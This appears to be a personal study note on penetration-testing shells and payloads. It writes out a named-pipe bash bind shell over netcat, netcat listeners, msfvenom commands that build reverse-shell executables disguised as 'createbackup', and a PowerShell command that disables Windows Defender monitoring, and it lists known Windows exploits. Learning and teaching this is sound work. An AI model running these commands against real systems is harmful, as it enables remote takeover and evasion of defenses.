## Shells and Payloads

<br>

### Shells v Payloads 
```
# A shell allows the user to interact with the system typically via a command line interface. Examples of shells are bash, zsh, cmd, and powershell

# Payloads are code designed to carry out a exploit or vulnerability on a system. (ie ransomeware)
```

<br>

### Anatomy of a Shell
```
# All OSs have shells. To interact with the shells you must use a "Terminal Emulator", which simulates a terminal and allows interaction with a systems OS
  1. Windows Terminal, cmder, PuTTY, kitty, alacritty, xterm, GNOME terminal, MATE terminal, konsole, Terminal, iTerm2


# Common Language Interpreter (Not to be confused with CLI - Command Line Interface): Interprets user commands and translates them for the OS to run commands
  1. $ marks the start of a shell prompt 

  2. run the following command to find out what command line interpreter you are using 
    echo $SHELL

```

<br>


### Bind shells 
```
# Bind shell is there the target has a listener setup and the attacker attaches to it 
# The following is just a TCP connection with nc, not a shell
  1. Start nc on remote machine 
    nc -lvnp 7777

  2. Use nc on local machine to attach to listener 
    nc -nv [ip of remote machine] [port]


# Use nc to setup a shell
  1. Create FIFO folder, pipe bash to stdout, setup nc listener and any stdin will be put in the FIFO folder. This command is loop that passes messages from the nc listener into a file that is then pushed into a bash shell and outputted to stdout which is then sent back to the nc listener 
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l [port] > /tmp/f

  2. Connect to the listener 
    nc -nv [ip] [port]
```

<br>

### Reverse Shells
```
# Reverse shells setup a listener on the host and have the remote machine connect to them. This is typically a better option as oubound traffic rules are more relaxed than inbound, allowing for undetected engagement


# Reverse Shell Code Cheat Sheet - Take a look at the Reverse Shell Generator 
  1. https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/


# Simple Reverse Shell - Using common ports is sometimes a way to avoid firewall rules
  1. Start Listener on Host 
    sudo nc -lvnp 443

  2. Use Shell generator & disable windows monitoring 
    https://www.revshells.com/
    Set-MpPreference -DisableRealtimeMonitoring $true


```

<br>

### Metasploit - Automating Payloads and Delivery
```
# Payload is the intended message, which in Cybersecurity is the code that exploits a systems vulnerabilities
```

<br>

### msfvenom 
```
# Staged Payloads send over small stages that establish a connection that will then send over more information. A downside to this can be too much memory taken up.
linux/x86/shell/reverse_tcp

# Stageless Payloads send over everything at once and dont setup and stages before hand. Downsides to this are unstable shells 
linux/zarch/meterpreter_reverse_tcp

# Building a stageless payload with msfvenom 
  1. msfvenom -p linux/x64/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f elf > createbackup.elf
    a. -p tell msfvenom to create a payload 

  2. msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f exe > createbackup.exe
```

<br> 


### Infiltrating Windows 
```
# Windows Attack Surface: https://www.cvedetails.com/vendor/26/Microsoft.html


# Popular Exploits: 
  1. MS08-067
  2. Eternal Blue
  3. PrintNightmare
  4. Bluekeep 
  5. Sigred
  6. SeriousSam
  7. Zerologon


# Determine if a machine is Windows 
  1. TTL == 128 if 128/33 if its windows | 64 if linux | AIX/Solaris is 254 
    a. Detailed list: https://subinsb.com/default-device-ttl-values/

  2. nmap os detection using "-O" option and high verbosity 

  3. nmap banner.nse script to pull banner information from any open ports 
    sudo nmap -v 192.168.86.39 --script banner.nse


# Batch Files, DLLs, and MSI files 
  1. DLLs - Dynamically Linked Libraries provide shared code and data to many different programs at once.

  2. Batch Files - Text Based DOS Scripts used by admins to complete tasks. 

  3. VBScript - Visual Basic Script used for client side scripting

  4. MSI - Install database for Windows Installer

  5. Powershell - Dynamic Langugage based on the .NET Common Language Runtime


# Payload Generation
  1. msfvenom, msf framework 

  2. Payload all the things 

  3. Mythic C2 Framework 

  4. Nishang 

  5. Darkarmour 


# Payload Transfer and Execution 
  1. Impacket: Python tool used to interact directly with network protocols 

  2. Payload All The Things: Useful Oneliners

  3. SMB file transfer 

  4. MSF 

  5. ftp, tftp, http/s 


```
